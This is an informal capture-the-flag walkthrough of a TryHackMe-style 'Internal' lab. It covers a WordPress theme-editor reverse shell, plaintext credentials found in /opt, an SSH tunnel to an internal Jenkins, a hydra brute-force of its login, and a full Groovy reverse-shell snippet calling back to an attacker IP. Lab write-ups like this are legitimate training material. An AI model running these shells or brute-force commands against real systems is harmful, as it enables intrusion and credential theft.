@@ -673,3 +673,144 @@ Trying admin / kambal Time: 00:01:01 <                                          
 Current administration email: **admin@internal.thm**
 
 i hit this email is correct when asked to verify email http://internal.thm/blog/wp-admin/index.php btw the credentials admin my2boys worked
+
+when I logged in i tried uploading pentest monkey's reverse shell to a custom plugin, failed
+
+when looking up exploitations I saw ways of sanitizing payloads with % after the file extension (like in burpsuite) which I tried and didn't work so I tried one that exploits theme editors which run .php files and you can edit them in the browser. So I changed the 404 template to the pentest monkey reverse shell and then moved to the archive.php to find the comment telling me where the link is to the theme pages. Which told me @link https://developer.wordpress.org/themes/basics/template-hierarchy/ was the template for displaying archive pages which I dont think is actually what I want then I remembered wordpress scan has already enumerated the twentyseventeen directories so we have http://10.10.217.97/wordpress/wp-content/themes/twentytwenty/ and the file 404.php after fiddling with trying to get a shell to pop I got it to pop
+
+I see in the home folder a user named aubreanna it let me cat etc/passwd 
+
+$ cat etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+$ 
+
+and there we see aurbreanna unfortunately we cant cat etc/shadow her being in the 1000s tells me its a created user I also found out from etc/group that aubreanna was an admin
+
+by snooping in the syswide I did crontab -l to see if there was anything local, no so I checked system wide crontab. there was a cronjob called passwd in cron.daily so I opened it:
+
+$ cat /etc/cron.daily/passwd
+#!/bin/sh
+
+cd /var/backups || exit 0
+
+for FILE in passwd group shadow gshadow; do
+        test -f /etc/$FILE              || continue
+        cmp -s $FILE.bak /etc/$FILE     && continue
+        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
+done
+$ ls /var/backups
+alternatives.tar.0
+apt.extended_states.0
+apt.extended_states.1.gz
+dpkg.diversions.0
+dpkg.statoverride.0
+dpkg.status.0
+group.bak
+gshadow.bak
+passwd.bak
+shadow.bak
+$  
+
+unfortunately I am not allowed to read /var/backups only root has read perms after digging around I find a text file in /opt
+
+$ cat /opt/wp-save.txt
+Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:bubb13guM!@#123
+$ 
+we now have aubreanna's password so we login with her SSH credentials
+
+Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
+aubreanna@internal:~$ ls
+jenkins.txt  snap  user.txt
+aubreanna@internal:~$ cat user.txt
+THM{int3rna1_fl4g_1}
+aubreanna@internal:~$ cat jenkins.txt
+Internal Jenkins service is running on 172.17.0.2:8080
+aubreanna@internal:~$ 
+
+and get the user flag and info about a jenkins server, problem is that its on a different internal network so I have to pivot. I did something similar in so by setting the local and remote ports for a port forwarded ssh tunnel we can logon to 172.17.0.2 
+┌──(kali㉿kali)-[~]
+└─$ ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.5.22
+and then open a web browser on 127.0.0.1:8080 and I get the jenkins interface none of the default credentials work and I didn't see anything else about the jenkins server
+
+
+┌──(kali㉿kali)-[~]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid username or password"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-08 20:03:03
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://127.0.0.1:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid username or password
+[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-08 20:04:11
+
+String host="10.23.80.154";
+int port=8044;
+String cmd="/bin/sh";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+So jenkins has a groovy script console so I found this reverse shell on github and stumbled upon the root credentials but I can't sudo su to just login as root it says I can only login as terminal 
+
+
+ls opt
+note.txt
+cat opt/note.txt
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+sudo su
+
+huh I wonder how we can get in as terminal
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh root@10.10.13.105                              
+root@10.10.13.105's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
+root@internal:~# ls
+root.txt  snap
+root@internal:~# cat root.txt
+THM{d0ck3r_d3str0y3r}
